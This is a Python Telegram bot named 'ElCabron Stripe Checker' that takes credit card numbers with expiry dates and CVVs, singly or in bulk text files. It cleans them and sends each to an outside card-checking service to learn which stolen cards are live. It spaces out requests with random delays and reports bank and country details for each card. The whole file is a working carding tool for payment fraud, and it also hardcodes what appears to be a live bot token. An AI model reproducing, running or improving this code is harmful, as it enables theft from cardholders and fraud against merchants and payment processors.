import requests
import json
import time
import random
import os
import re
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# === CONFIG ===
TOKEN = "7908952043:AAFCen0ZLLSq1U2v-oKw-emiReRnkP9FaKw"
BASE_URL = "https://freechk.cards/stripe/free.php?lista="
MIN_DELAY = 3
MAX_DELAY = 7
CHECKED_BY = "ElCabron"
DEV_BY = "@ElCabron"
# =============

# Delay
def rand_delay():
    delay = random.uniform(MIN_DELAY, MAX_DELAY)
    time.sleep(delay)

# Normalize card: replace / : or multiple spaces with |
def normalize_card(raw):
    raw = raw.strip()
    # Replace / or : with |
    raw = re.sub(r'[/:]', '|', raw)
    # Remove extra spaces
    raw = re.sub(r'\s+', '', raw)
    return raw

# Validate final format: 8+ digits | 2 digits | 2 digits | 3 digits
def is_valid_card(card):
    return bool(re.match(r"^\d{8,}\|\d{2}\|\d{2}\|\d{3}$", card))

# Check one card
def check_card(card):
    start_time = time.time()
    try:
        url = BASE_URL + card
        resp = requests.get(url, timeout=15)
        elapsed = time.time() - start_time
        try:
            return resp.json(), elapsed, True
        except:
            return resp.text[:500], elapsed, False
    except Exception as e:
        return f"ERROR: {e}", 0, False

# Format result
def format_result(card, data, elapsed, is_json):
    parts = card.split('|')
    cc = parts[0]
    mm, yy, cvv = parts[1], parts[2], parts[3]

    if not is_json:
        return f"Raw response:\n{data}"

    status = data.get("status", "unknown").title()
    message = data.get("message", "No message")
    brand = data.get("brand", "Unknown").upper()
    card_type = data.get("type", "unknown").title()
    country = data.get("country", "Unknown")
    bank = data.get("bank", "Unknown")
    
    if "declined" in message.lower():
        status = "Decline"
        response = message
    else:
        response = message

    bin_info = f"{brand} - {card_type.upper()} - STANDARD"
    
    return f"""#Stripe_Charge [/chk] - - - - - - - - - - - - - - - - - - - - - - - 
Card: {cc}|{mm}|{yy}|{cvv} 
Status: {status} 
Response: {response} 
- - - - - - - - - - - - - - - - - - - - - - - 
[Lightning] Bin: {bin_info} 
[Lightning] Bank: {bank} - 
[Lightning] Country: {country} [ ] 
- - - - - - - - - - - - - - - - - - - - - - - 
Time: {elapsed:.2f}s 
Checked by: {CHECKED_BY} 
- - - - - - - - - - - - - - - - - - - - - - - 
Dev by: {DEV_BY} 
- - - - - - - - - - - - - - - - - - - - - - - 
Remaining Checks: Infinite"""

# Process cards
def process_cards(cards):
    results = []
    for i, raw_card in enumerate(cards):
        card = normalize_card(raw_card)
        if not is_valid_card(card):
            results.append(f"[INVALID] {raw_card}")
            continue
        data, elapsed, is_json = check_card(card)
        result = format_result(card, data, elapsed, is_json)
        results.append(result)
        if i < len(cards) - 1:
            rand_delay()
    return "\n\n".join(results)

# === /clean - REMADE FROM SCRATCH ===
async def clean(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # Must reply to a .txt file
    if not update.message.reply_to_message or not update.message.reply_to_message.document:
        await update.message.reply_text("Reply to a .txt file with /clean")
        return

    doc = update.message.reply_to_message.document
    if not doc.file_name.lower().endswith('.txt'):
        await update.message.reply_text("Only .txt files")
        return

    status = await update.message.reply_text("Downloading file...")

    # Download
    file = await doc.get_file()
    input_path = f"raw_{doc.file_unique_id}.txt"
    output_path = "cleaned.txt"
    await file.download_to_drive(input_path)

    await status.edit_text("Cleaning cards...")

    # Read and clean
    cleaned_cards = []
    with open(input_path, 'r', encoding='utf-8', errors='ignore') as f:
        for line in f:
            raw = line.strip()
            if not raw:
                continue
            norm = normalize_card(raw)
            if is_valid_card(norm):
                cleaned_cards.append(norm)

    os.remove(input_path)

    if not cleaned_cards:
        await status.edit_text("No valid cards found.")
        return

    # Save cleaned
    with open(output_path, 'w', encoding='utf-8') as f:
        f.write("\n".join(cleaned_cards))

    # Send file
    with open(output_path, 'rb') as f:
        await update.message.reply_document(
            document=f,
            filename="cleaned.txt",
            caption=f"Cleaned {len(cleaned_cards)} cards"
        )

    await status.delete()
    os.remove(output_path)

# /start
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "*ElCabron Stripe Checker*\n\n"
        "• Send CC: `4242/12/26/123` or `4242:12:2026:123`\n"
        "• Send .txt → auto-check\n"
        "• Reply to .txt with `/clean` → filter & normalize\n",
        parse_mode='Markdown'
    )

# Single CC
async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    raw = update.message.text.strip()
    card = normalize_card(raw)
    
    if not is_valid_card(card):
        await update.message.reply_text("Invalid format. Use:\n`card/mm/yy/cvv` or `card:mm:yyyy:cvv`")
        return

    msg = await update.message.reply_text(f"Checking: `{raw}`", parse_mode='Markdown')
    data, elapsed, is_json = check_card(card)
    result = format_result(card, data, elapsed, is_json)
    await msg.edit_text(result, parse_mode=None)

# File check
async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    doc = update.message.document
    if not doc.file_name.lower().endswith('.txt'):
        await update.message.reply_text("Only .txt")
        return

    status = await update.message.reply_text("Downloading...")
    file = await doc.get_file()
    path = f"temp_{doc.file_unique_id}.txt"
    await file.download_to_drive(path)

    cards = []
    with open(path, 'r', encoding='utf-8', errors='ignore') as f:
        for line in f:
            card = normalize_card(line)
            if is_valid_card(card):
                cards.append(card)

    os.remove(path)

    if not cards:
        await status.edit_text("No valid cards.")
        return

    await status.edit_text(f"{len(cards)} cards → Processing...")
    result = process_cards(cards)
    
    if len(result) > 4000:
        chunks = [result[i:i+4000] for i in range(0, len(result), 4000)]
        await status.delete()
        for c in chunks:
            await update.message.reply_text(c, parse_mode=None)
    else:
        await status.edit_text(result, parse_mode=None)

# Main
def main():
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("clean", clean))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
    print("[BOT LIVE] /clean FIXED + / : | SUPPORT")
    app.run_polling()

if __name__ == "__main__":
    main()